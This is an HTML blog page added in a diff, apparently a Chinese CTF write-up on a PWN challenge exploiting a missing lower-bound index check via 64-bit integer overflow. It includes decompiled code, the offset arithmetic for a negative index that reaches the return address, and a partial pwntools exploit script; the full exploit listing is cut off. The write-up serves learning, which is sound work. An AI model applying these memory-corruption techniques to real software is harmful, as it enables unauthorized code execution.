@@ -1,0 +1,940 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    
+    <meta name="author" content="Sadsnowcat">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2026/02/19/hacker/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Sadsnowcat&#39;s blog, a PWN learner">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一道PWN题(整数溢出)">
+<meta property="og:url" content="http://example.com/2026/02/19/hacker/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Sadsnowcat&#39;s blog, a PWN learner">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-02-19T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-02-22T10:42:13.151Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/favicon.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/favicon.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            记一道PWN题(整数溢出) | Sadsnowcat
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Sadsnowcat's blog, a PWN learner"},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/background-light.jpg","dark":"/images/background-dark.jpg"},"title":"Sadsnowcat","subtitle":{"text":["Documenting My PWN Learning Journey","Maybe every day will be better"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":[{"icon":"fa-brands fa-github","url":"https://github.com/sadsnowcat/"},{"icon":"fa-brands fa-twitter","url":null},{"icon":"fa-solid fa-at","url":"you@example.com"},{"icon":"fa-brands fa-telegram","url":null},{"icon":"/images/custom-icon.svg","url":null}],"qrs":[{"icon":"fa-brands fa-weixin","qr":null},{"icon":"/images/custom-icon.svg","qr":null}]}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Friends":{"path":"/links/","icon":"fa-regular fa-link"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footer":{"runtime":true,"icon":"<i class=\"fa-solid fa-heart fa-beat\" style=\"--fa-animation-duration: 0.5s; color: #f54545\"></i>","start":"2026/1/16 00:00:00","statistics":true,"customize":null,"icp":{"enable":false,"number":null,"url":null}},"footerStart":"2026/1/16 00:00:00","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.i18n = {"search":"Search...","toc":"On this page","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"POWERED BY %s","theme":"THEME","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","post":"Post","posts":"Posts","tagcloud":"Tag Cloud","comment":"Comment","comments":"Comments","home":"Home","archive":"Archive","archives":"Archives","top":"TOP","sticky":"Sticky","go-back-home":"Go Back Home","masonry_loading":"Loading photos...","image_viewer":"Image viewer","close":"Close","exif":{"title":"EXIF","cards":{"camera":"Camera","lens":"Lens","exposure":"Exposure","other":"Other"},"fields":{"make":"Brand","model":"Model","date_taken":"Date taken","lens_model":"Lens","focal_length":"Focal length","focus_mode":"Focus mode","shutter":"Shutter","aperture":"Aperture","iso":"ISO","exposure_program":"Exposure program","exposure_compensation":"Exposure compensation","metering_mode":"Metering mode","flash":"Flash","white_balance":"White balance","latitude":"Latitude","longitude":"Longitude","altitude":"Altitude"},"status":{"loading":"Loading...","no_exif":"No EXIF available","library_missing":"EXIF library not loaded","image_source_missing":"Image source unavailable","unavailable":"EXIF unavailable (blocked by CORS or missing metadata)","flag_unavailable":"EXIF unavailable"}},"about":"About","changelog":"Changelog","links":"Links","link":"Link","friends":"Friends","friend":"Friend","timeline":"Timeline","shuoshuo":"Shuoshuo","bookmarks":"Bookmarks","site_uv":"VISITOR COUNT","site_pv":"TOTAL PAGE VIEWS","read_more":"Read more","wordcount":"Words","min2read":"Mins","status":"Status","runtime":"Blog up for","days":"days","hours":"hrs","minutes":"Min","seconds":"Sec","optimized_by":"and Optimized by Evan","rights":"All Rights Reserved","site_posts":"%s posts in total","site_wordcount":"%s words in total","copyright":{"author":"Author","title":"Title","link":"Link","create_time":"Created at","update_time":"Updated at","license_title":"License","license_content":"This work is licensed under %s.","all_rights_reserved":"All Rights Reserved &#169; %s","public_domain":"This work is in the public domain."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"},"create_time":"Created","update_time":"Updated","expired":"This post is written %s days ago, and the content may not be up to date."};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Sadsnowcat
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links/"
+                                        >
+                                    <i class="fa-regular fa-link fa-fw"></i>
+                                    FRIENDS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links/"
+                        >
+                            <span>
+                                FRIENDS
+                            </span>
+                            
+                                <i class="fa-regular fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">记一道PWN题(整数溢出)</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/images/sadsnowcat.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Sadsnowcat</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-02-19 12:00</span>
+        <span class="mobile">2026-02-19 12:00</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-02-22 18:42:13</span>
+            <span class="mobile">2026-02-22 18:42:13</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/CTF/">CTF</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/PWN/">PWN</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<blockquote>
+<p>看起来很安全呢。</p>
+</blockquote>
+<p>做了很多栈溢出的题目，这道不太一样。这本质上是数组下标越界漏洞，由于缺少对索引下限的检查，配合整数溢出达成了任意地址写。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:       amd64-64-little</span><br><span class="line">RELRO:      Partial RELRO</span><br><span class="line">Stack:      Canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        No PIE (0x3fc000)</span><br><span class="line">Stripped:   No</span><br></pre></td></tr></table></figure></div>
+<p>查看IDA：<br>有后门函数shell，不过没有<code>&quot;bin/sh&quot;</code></p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>main()只有一些信息</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter administrator&#x27;s name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%9s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n--------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n--------------------&quot;</span>);</span><br><span class="line">  hacker();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>还有比较重要的<code>hacker()</code></p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">hacker</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-74h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+18h] [rbp-68h] BYREF</span></span><br><span class="line">  __int64 s[<span class="number">11</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to hacker&#x27;s system\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now you can set hackers&#x27; age\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x50u</span>LL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter hacker index:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;v3);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter hacker age:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">9</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    s[v3] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now let&#x27;s see your creation:&#x27;&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; ++j )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld &quot;</span>, s[j]);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>但是这里全部使用的是scanf而不是像read和gets这样的危险函数。很难进行栈溢出，这时注意到<code>s[11]</code>读取的逻辑是索引+内容，索引<code>v3 &gt; 9</code>则退出，最多读10次。</p>
+<hr>
+<p>以前做过的一些pwn题是填进去<code>-1</code>。<br>计算机存储有符号整数时，不会直接存正负号，而是用<strong>补码</strong>表示：</p>
+<ul>
+<li>正数的补码 &#x3D; 原码（直接是数字的二进制）</li>
+<li>负数的补码 &#x3D; 对应正数的原码「按位取反 + 1」<br>比如:</li>
+<li>64位整数<code>__int64</code>，-1会以0xFFFFFFFFFFFFFFFF储存</li>
+<li>32位整数即<code>int</code>，-1以0xFFFFFFFF</li>
+<li>8位整数，-1以0xFF表示</li>
+</ul>
+<p>数组<code>s</code>位于<code>rbp - 0x60</code>，而函数返回地址位于 <code>rbp + 0x08</code>。<br>从 <code>s</code> 的起始点到返回地址需要跳过多少个字节：0x08 - (-0x60) &#x3D; 0x68，也就是104字节。<br>由于数组 <code>s</code> 是 <code>__int64</code> 类型，每个元素占 8 字节，我们要找的索引 $v3$ 应该是：$104 &#x2F; 8 &#x3D; 13$<br>但代码里有 <code>if (v3 &gt; 9) exit(0);</code>，直接输入 <code>13</code> 会导致程序自杀。</p>
+<p>在 64 位系统中，内存地址计算是基于 64 位无符号数的。当你访问 <code>s[v3]</code> 时，底层汇编做的事情是：$\text{目标地址} &#x3D; \text{数组首地址} + (v3 \times 8)$<br>比如：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     rax, [rbp+var_70]</span><br><span class="line">mov     rdx, [rbp+var_68]</span><br><span class="line">mov     [rbp+rax*8+s], rdx</span><br><span class="line">add     [rbp+var_74], 1</span><br></pre></td></tr></table></figure></div>
+
+<p>如果我们将 $v3$ 设为一个极大的负数，当它乘以 $8$ 时，结果会超出64位寄存器能表达的最大值，从而回到小的值<br>把 $2^{64}$ 这个“圆圈”想成一个巨大的数。我们要找的 $v3$ 实际上是：<br>$$v3 &#x3D; (104 - 2^{64}) &#x2F; 8$$</p>
+<ul>
+<li>$2^{64} &#x3D; 18,446,744,073,709,551,616$</li>
+<li>$104 - 2^{64} &#x3D; -18,446,744,073,709,551,512$</li>
+<li>除以 8：$-18,446,744,073,709,551,512 &#x2F; 8 &#x3D; -2,305,843,009,213,693,939$<br>这就是那个魔法数字：**<code>-2305843009213693939</code>**</li>
+</ul>
+<hr>
+<p>那么先测试一下，</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">shell = <span class="number">0x4007e6</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload</span>(<span class="params">idx, val</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;index:&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;age:&quot;</span>, <span class="built_in">str</span>(val).encode())</span><br><span class="line"></span><br><span class="line">magic = -<span class="number">2305843009213693939</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;name:&quot;</span>, <span class="string">b&quot;snowcat&quot;</span>)</span><br><span class="line">send_payload(magic, shell)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;index:&quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;age:&quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+<p>这里将<code>shell</code>改成<code>shell+1</code>成功打印了id信息，因为需要跳过<code>push rbp</code><br>说明可行。之后是想怎么执行”&#x2F;bin&#x2F;sh”，<br>这时想到<code>main()</code>中可以读9个字节，但是比较麻烦，想到已经可以在返回地址中写rop了，于是ret2libc。<br>笔者直接迷住了。<br>完整exp如下：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 